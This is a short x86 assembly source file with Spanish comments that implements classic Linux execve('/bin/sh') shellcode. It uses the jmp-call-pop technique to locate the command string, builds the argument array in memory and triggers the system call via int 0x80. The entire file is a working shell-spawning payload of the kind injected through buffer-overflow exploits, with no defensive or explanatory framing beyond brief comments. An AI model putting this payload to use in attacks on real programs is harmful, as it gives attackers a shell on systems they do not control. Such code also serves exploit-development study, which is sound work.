section .text

global _main
_main:
    jmp _get_str
_get_str:
    call _shellcode
    db "/bin/shABBBBCCCC"
_shellcode:
    pop ebx             ; rescatamos comando
    xor eax,eax 
    mov [ebx+7],al      ; "/bin/sh"0BBBBCCCC
    mov [ebx+8],ebx     ; "/bin/sh"0, &"/bin/sh"0CCCC
    mov [ebx+12],eax    ; "/bin/sh"0, $"/bin/sh"
    lea ecx,[ebx+8]
    lea edx,[ebx+12]
    mov al,11
    int 0x80
